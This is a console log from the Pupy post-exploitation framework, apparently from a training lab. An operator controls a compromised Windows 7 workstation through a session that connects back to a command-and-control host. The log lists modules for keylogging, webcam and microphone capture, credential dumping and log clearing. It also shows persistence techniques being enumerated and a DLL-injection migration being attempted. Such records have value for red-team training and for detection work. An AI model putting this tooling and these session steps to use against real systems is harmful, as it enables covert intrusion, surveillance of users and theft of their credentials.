-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> help persistence
Module: persistence: Enable / Disable Persistence

usage: persistence [-h] [-s] [-p PAYLOAD] [-n NAME] [-m METHOD] [-l]
                   [--remove]

Enable / Disable persistence 

optional arguments:
  -h, --help    show this help message and exit
  -s, --shared  prefer shared object (linux only)
  -p PAYLOAD    remote path or cmd to execute at login (windows only)
  -n NAME       custom name to use (windows only)
  -m METHOD     should be an ID, get the list (-l) scanning which methods are
                possible (windows only)
  -l            list all possible techniques for this host (windows only)
  --remove      remove persistence


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> persistence -l
[%] Comparing build number (7601) against 'Fixed In' build numbers, false positives might happen.

 Id:    Type:           Payload:        Admin:          Description:
 ----   -----------     -----------     --------        -----------------------
[+] 1	Persistence	True		False		Gain persistence using explorer and dll hijacking
[-] 2	Persistence	True		True		Gain persistence with system privilege using mofcomp and mof file
[-] 3	Persistence	True		True		Gain persistence with system privilege using schtasks
[-] 4	Persistence	True		True		Gain persistence using IFEO debugger registry key
[-] 5	Persistence	True		True		Gain persistence using Userinit registry key
[+] 6	Persistence	True		False		Gain persistence using HKEY_CURRENT_USER Run registry key
[-] 7	Persistence	True		True		Gain persistence using HKEY_LOCAL_MACHINE Run registry key
[-] 8	Persistence	True		True		Gain persistence with system privilege using wmic
[+] 9	Persistence	True		False		Gain persistence using Startup Files
[-] 10	Persistence	True		False		Gain persistence using Cortana app which loads at login
[-] 11	Persistence	True		False		Gain persistence using People app which loads at login
>> ls c:\users\downloads
[-] The file/path does not exist
>> pwd
[+] C:\Windows\SysWOW64
>> cd C:\Users\
[-] Traceback (most recent call last):
  File "/home/ol/pupy/pupy/pupylib/PupyCmd.py", line 429, in cmdloop
    cmd.Cmd.cmdloop(self, intro)
  File "/usr/lib/python2.7/cmd.py", line 142, in cmdloop
    stop = self.onecmd(line)
  File "/usr/lib/python2.7/cmd.py", line 220, in onecmd
    return self.default(line)
  File "/home/ol/pupy/pupy/pupylib/PupyCmd.py", line 378, in default
    return self.execute(line)
  File "/home/ol/pupy/pupy/pupylib/PupyCmd.py", line 394, in execute
    clients_filter)
  File "/home/ol/pupy/pupy/commands/__init__.py", line 115, in execute
    clients_filter=clients_filter or handler.default_filter
  File "/home/ol/pupy/pupy/commands/__init__.py", line 62, in _get_command
    argv = shlex.split(cmdline)
  File "/usr/lib/python2.7/shlex.py", line 279, in split
    return list(lex)
  File "/usr/lib/python2.7/shlex.py", line 269, in next
    token = self.get_token()
  File "/usr/lib/python2.7/shlex.py", line 96, in get_token
    raw = self.read_token()
  File "/usr/lib/python2.7/shlex.py", line 191, in read_token
    raise ValueError, "No escaped character"
ValueError: No escaped character
>> >> pwd
[+] C:\Windows\SysWOW64
>> cd ..
>> cd ..
>> ls
C:\:
  23/12/18  D      0.0B $Recycle.Bin                            
  14/07/09  D      0.0B Documents and Settings                  
  16/01/19  D      0.0B MSOCache                                
  13/07/09  D      0.0B PerfLogs                                
  16/01/19  D      0.0B Program Files                           
  16/01/19  D      0.0B Program Files (x86)                     
  16/01/19  D      0.0B ProgramData                             
  28/11/18  D      0.0B Recovery                                
  13/02/19  D      0.0B System Volume Information               
  23/12/18  D      0.0B Users                                   
  16/01/19  D      0.0B Windows                                 
  21/12/18  D      0.0B found.000                               
  13/02/19         1.5G hiberfil.sys                            
  13/02/19         2.0G pagefile.sys                            
[%] Summary: Files: 2 (size: 3.5G) Dirs: 12 Total: 14
>> cd Users
>> ls
C:\Users:
  14/07/09  D      0.0B Default                                 
  14/07/09  D      0.0B Default User                            
  14/07/09  D      0.0B Public                                  
  22/12/18  D      0.0B kroberts                                
  23/12/18  D      0.0B kroberts.RESEARCH                       
  28/11/18  D      0.0B ol                                      
  14/07/09  L      0.0B All Users -> C:\ProgramData             
  14/07/09       174.0B desktop.ini                             
[%] Summary: Files: 2 (size: 174.0B) Dirs: 6 Total: 8
>> cd kroberts.RESEARCH
>> ls
C:\Users\kroberts.RESEARCH:
  23/12/18  D      0.0B AppData                                 
  23/12/18  D      0.0B Application Data                        
  23/12/18  D      0.0B Contacts                                
  23/12/18  D      0.0B Cookies                                 
  13/01/19  D      0.0B Desktop                                 
  23/12/18  D      0.0B Documents                               
  11/02/19  D      0.0B Downloads                               
  23/12/18  D      0.0B Favorites                               
  23/12/18  D      0.0B Links                                   
  23/12/18  D      0.0B Local Settings                          
  23/12/18  D      0.0B Music                                   
  23/12/18  D      0.0B My Documents                            
  23/12/18  D      0.0B NetHood                                 
  23/12/18  D      0.0B Pictures                                
  23/12/18  D      0.0B PrintHood                               
  23/12/18  D      0.0B Recent                                  
  23/12/18  D      0.0B Saved Games                             
  23/12/18  D      0.0B Searches                                
  23/12/18  D      0.0B SendTo                                  
  23/12/18  D      0.0B Start Menu                              
  23/12/18  D      0.0B Templates                               
  23/12/18  D      0.0B Videos                                  
  13/02/19       768.0K NTUSER.DAT                              
  24/12/18        64.0K NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
  24/12/18       512.0K NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
  24/12/18       512.0K NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
  13/02/19       256.0K ntuser.dat.LOG1                         
  23/12/18         0.0B ntuser.dat.LOG2                         
  23/12/18        20.0B ntuser.ini                              
[%] Summary: Files: 7 (size: 2.1M) Dirs: 22 Total: 29
>> cd Downloads
>> dir
[-] Unknown (or unavailable) command dir. Use help -M to list available commands and modules
>> ls
C:\Users\kroberts.RESEARCH\Downloads:
  13/01/19  D      0.0B Win7AndW2K8R2-KB3191566-x64 (1)         
  13/01/19  +     42.7M Win7-KB3191566-x86.zip                  
  13/01/19  +     64.9M Win7AndW2K8R2-KB3191566-x64 (1).zip     
  13/01/19  +     64.9M Win7AndW2K8R2-KB3191566-x64.zip         
  23/12/18       282.0B desktop.ini                             
  11/02/19  +      9.3M domain-check.ps1                        
  02/02/19  +      6.2K ms-2018.hta                             
  02/02/19  +      5.6K update-instructions.doc                 
[%] Summary: Files: 7 (size: 181.9M) Dirs: 1 Total: 8
>> help 
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ ALIASED MODULES }
MODULE   DESCRIPTION                                        
------------------------------------------------------------
alive    request to send keepalive packets on rpyc level    
cp       copy file or directory                             
exit     exit the client on the other side                  
rm       remove a file or a directory                       
netstat  list terminal sessions                             
last     list terminal sessions                             
w        list terminal sessions                             
cd       change directory                                   
date     Get current date                                   
ps       list processes                                     
mkdir    create an empty directory                          
forward  Local/remote port forwarding and SOCKS proxy       
ls       list system files                                  
pwd      Get current working dir                            
cat      show contents of a file                            
mv       move file or directory                             
ip       list interfaces                                    
getpid   list process information                           
http     Trivial Get/Post requests via HTTP protocol        
getppid  list parent process information                    
getuid   get username                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        

Use help -M command to show all available modules
>> info
hostname       RSRCH-WIN7-WS1                                       
user           RESEARCH\kroberts                                    
release        7                                                    
version        6.1.7601                                             
os_arch        AMD64                                                
proc_arch      32bit                                                
pid            2668                                                 
exec_path      C:\Program Files (x86)\Dropbox\Client\Dropbox.exe    
cid            0000000006b319b0                                     
address        172.16.0.7                                           
macaddr        1e:97:2d:f3:32:85                                    
revision       ?                                                    
node           1e972df33285                                         
native         True                                                 
proxy          ?                                                    
external_ip    ?                                                    
uac_lvl        2/3                                                  
intgty_lvl     Medium                                               
local_adm      Yes                                                  
transport      tcp_cleartext                                        
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
platform       windows/x86                                          
>> module -M
[-] Unknown (or unavailable) command module. Use help -M to list available commands and modules
>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> getprivs
{ Current priviliges }
Privilege                      Enabled  
----------------------------------------
SeShutdownPrivilege            False    
SeChangeNotifyPrivilege        True     
SeUndockPrivilege              False    
SeIncreaseWorkingSetPrivilege  False    
SeTimeZonePrivilege            False    
>> exploit_suggester
[-] no windows database file found. Please connect the server to internet and launch the --update command
>> getppid
[+] Parent Name: None
[+] PPID: None
>> help upload
Module: upload: Upload A File/Directory To A Remote System

usage: upload [-h] <local_path> [<remote_path>]

upload a file/directory to a remote system 

positional arguments:
  <local_path>
  <remote_path>

optional arguments:
  -h, --help     show this help message and exit


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> sessions
id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4064 C:\Windows\System32\conhost.exe 21440309532060843664390671815415894643-14328960741663172516-372837770-841349633
4412 C:\Windows\SysWOW64\cmd.exe /K CHCP 437
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> migrate 4412
[+] Migrating to existing windows process identified with the pid 4412
[+] looking for configured connect back address ...
[+] address configured is 172.16.11.106:8888 ...
[+] looking for process 4412 architecture ...
[+] process is 32 bits

{ Configuration }
KEY            VALUE                                                
--------------------------------------------------------------------
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
cid            112400816                                            

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] Template: pupyx86.dll
[+] injecting DLL in target process 4412 ...
[+] DLL injected !
[+] waiting for a connection from the DLL ...
[-] migration timed out !
>> help
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ ALIASED MODULES }
MODULE   DESCRIPTION                                        
------------------------------------------------------------
alive    request to send keepalive packets on rpyc level    
cp       copy file or directory                             
exit     exit the client on the other side                  
rm       remove a file or a directory                       
netstat  list terminal sessions                             
last     list terminal sessions                             
w        list terminal sessions                             
cd       change directory                                   
date     Get current date                                   
ps       list processes                                     
mkdir    create an empty directory                          
forward  Local/remote port forwarding and SOCKS proxy       
ls       list system files                                  
pwd      Get current working dir                            
cat      show contents of a file                            
mv       move file or directory                             
ip       list interfaces                                    
getpid   list process information                           
http     Trivial Get/Post requests via HTTP protocol        
getppid  list parent process information                    
getuid   get username                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        

Use help -M command to show all available modules
>> sessions
